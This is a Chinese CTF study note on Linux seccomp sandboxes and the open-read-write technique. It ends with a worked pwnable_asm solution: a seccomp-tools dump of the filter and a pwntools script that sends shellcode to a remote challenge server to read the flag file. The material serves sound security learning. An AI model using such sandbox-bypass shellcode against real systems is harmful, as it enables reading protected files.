---
title: pwn-sandbox1
date: 2022-05-10 23:40:06
tags:
---
# 沙盒利用

## 沙盒

- 作用：沙盒(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限

## 常见函数

- `Secommp`库：是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。但它本身不是一种沙盒，一种减少 Linux 内核暴露的机制，是构建一个安全的沙盒的重要组成部分。
  - 作用：`Seccomp` 在最初引入的时候只支持了 strict mode，意味着只有 `read ，write ，_exit ，_sigreturn`四个 system call 会被允许。一旦出现其他的 system call，进程会被立刻终止 。后来又引入了 filter mode 模式，也就是 BPF，这样可调用的函数可以人为控制。
  - 引入标识
    ```cpp
    #include <linux/seccomp.h>
    ```
  - 利用方式：调用`Seccomp`时，基本意味着 `execve` 这种系统调用被禁用了(`system`是通过调用`execve`来实现的)，想通过这种方法拿到 shell 不可能。所以考虑利用其他函数来获得 flag，常用的方式就是 orw/p(open-read-write/puts)来读出 flag(用 open 打开 flag 文件，然后读出 flag，最后向 terminal 写出 flag)
- `prctl`函数

  - 函数原型

    ```cpp
    #include <sys/prctl.h>
    int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    
    // option选项有很多，剩下的参数也由option确定，这里介绍两个主要的option
    // PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)
    
    // option为38的情况
    // 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用
    prctl(38, 1LL, 0LL, 0LL, 0LL);
    
    // option为22的情况
    // 只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall
    // 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。
    prctl(22, 2LL, &v1);
    ```

## 常用工具

- seccomp-tools

  ```shell
  sudo apt install gcc ruby-dev
  sudo gem install seccomp-tools
  ```

  - 常用命令

    ```shell
    seccomp-tools dump file_name
    #查看文件哪些系统调用被禁用，哪些允许使用
    ```

## orw/p 函数参数的深入

- 文件标识符：
  - 默认保留的 3 个：0-标准输入 1-标准输出 2-标准错误
  - 调用`open`时，文件标识符从 3 开始，每调用一次+1，直到`close`时才重置为 3

* open
  - 函数定义
    ```cpp
    int open(const char *pathname, int oflag, ... /* mode_t mode */);
    //pathname:文件路径
    //oflag:打开方式(O_RDONLY:只读模式、O_WRONLY:只写模式、 O_RDWR:读写模式)
    //成功返回文件句柄 ，失败返回-1
    ```
* read
  - 函数定义
    ```cpp
    int read(int fd,void *buf,int len);
    //fd:要读取的文件，如果调用了open，可以传入文件标识符，也可以打开
    //*buf:为要将读取的内容保存的缓冲区
    //len:读入的长度
    ```
* write

  - 函数定义

    ```cpp
    int write (int fd, const void * buf, size_t count);
    //write()会把参数buf所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.
    //返回值：如果顺利write()会返回实际写入的字节数. 当有错误发生时则返回-1, 错误代码存入errno 中.
    ```

* puts
  - 输出截断标识`\x00`

## 例题
### pwnable_asm
+ 分析：经典的orw
  
   题目
  
   ``` cpp
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     size_t v3; // rdx
     char *s; // [rsp+18h] [rbp-8h]
   
     setvbuf(stdout, 0LL, 2, 0LL);
     setvbuf(stdin, 0LL, 1, 0LL);
     puts("Welcome to shellcoding practice challenge.");
     puts("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.");
     puts("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.");
     puts("If this does not challenge you. you should play 'asg' challenge :)");
     s = (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL);
     memset(s, 144, 0x1000uLL);
     v3 = strlen(stub);
     memcpy(s, stub, v3);
     printf("give me your x64 shellcode: ");
     read(0, s + 46, 0x3E8uLL);
     alarm(0xAu);
     chroot("/home/asm_pwn");
     sandbox("/home/asm_pwn");
     ((void (__fastcall *)(const char *))s)("/home/asm_pwn");
     return 0;
   }
   ```
  
  
  
  分析题目，有sandbox，所以开启了沙盒保护，所以先用seccomp-tools检查哪些系统调用被允许。
  
  ``` shell
   seccomp-tools dump ./asm
    line  CODE  JT   JF      K
  =================================
   0000: 0x20 0x00 0x00 0x00000004  A = arch
   0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
   0002: 0x20 0x00 0x00 0x00000000  A = sys_number
   0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
   0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
   0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
   0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
   0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
   0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
   0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
   0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0011: 0x06 0x00 0x00 0x00000000  return KILL
  ```
  
  
  
  发现系统允许调用`read write open`，所以就用`orw`，然后考虑我们应该把`open`出的`flag`读到哪里。注意到
  
  `s = (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL)`，表明在`0x41414000`这里开辟了`0x1000`的内存大小。所以考虑读入到`0x41414000`。然后payload中使用了`shellcraft`模块来生成`shellcode`。具体怎么使用，以后在具体总结总结
  
  再说一下`mmap`函数的作用(`mmap`, 从函数名就可以看出来这是memory map, 即地址的映射, 是一种内存映射文件的方法)
  
  ``` cpp
  void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset); 
  //start:映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。
  //映射区的长度。//长度单位是 以字节为单位，不足一内存页按一内存页处理 
  //成功执行时，mmap()返回被映射区的 指针，失败时，mmap()返回MAP_FAILED[其值为(void *)-1]
  ```
  
  
  
+ payload
  ``` python
  from pwn import *
  context(arch='amd64',os='Linux',log_level='debug')
  p=remote('node4.buuoj.cn','27383')
  elf=ELF('./asm')
  offset=0x41414000
  payload=''
  payload=shellcraft.open('flag')+shellcraft.read(3,offset,0x100)+shellcraft.write(1,offset,0x100)
  payload=asm(payload)
  p.sendline(payload)
  p.interactive()
  ```